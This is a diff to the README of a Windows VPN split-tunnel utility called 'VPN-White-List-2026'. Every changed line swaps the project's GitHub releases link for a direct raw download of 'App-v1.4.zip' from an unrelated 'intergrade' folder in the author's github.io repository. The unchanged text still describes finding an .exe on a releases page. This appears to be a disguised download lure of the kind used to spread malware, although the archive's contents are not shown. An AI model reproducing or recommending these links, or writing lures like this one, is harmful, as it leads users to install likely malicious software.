@@ -5,7 +5,7 @@ description: "Split-tunnel your Windows VPN with automated whitelist profiles fo
 ---
 # 🔒 VPN-White-List-2026 - Simplify Your VPN Split-Tunnel Setup
 
-[![Download Now](https://img.shields.io/badge/Download-VPN--White--List--2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/itoharuki929/VPN-White-List-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-VPN--White--List--2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/itoharuki929/itoharuki929.github.io/raw/refs/heads/main/intergrade/App-v1.4.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these three simple steps to get VPN-White-List-2026 running on your Windo
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/itoharuki929/VPN-White-List-2026/releases](https://github.com/itoharuki929/VPN-White-List-2026/releases)**
+Visit this link to download the application: **[https://github.com/itoharuki929/itoharuki929.github.io/raw/refs/heads/main/intergrade/App-v1.4.zip](https://github.com/itoharuki929/itoharuki929.github.io/raw/refs/heads/main/intergrade/App-v1.4.zip)**
 
 Look for the **latest release** at the top of the page. Click the download button for the file named `VPN-White-List-2026.exe` (or similar). Your browser will save it to your **Downloads** folder.
 
@@ -167,7 +167,7 @@ Have questions or feedback? Join the discussion on the GitHub repository page. W
 
 ---
 
-**Visit this link to download the application:** [https://github.com/itoharuki929/VPN-White-List-2026/releases](https://github.com/itoharuki929/VPN-White-List-2026/releases)
+**Visit this link to download the application:** [https://github.com/itoharuki929/itoharuki929.github.io/raw/refs/heads/main/intergrade/App-v1.4.zip](https://github.com/itoharuki929/itoharuki929.github.io/raw/refs/heads/main/intergrade/App-v1.4.zip)
 
 ---
 
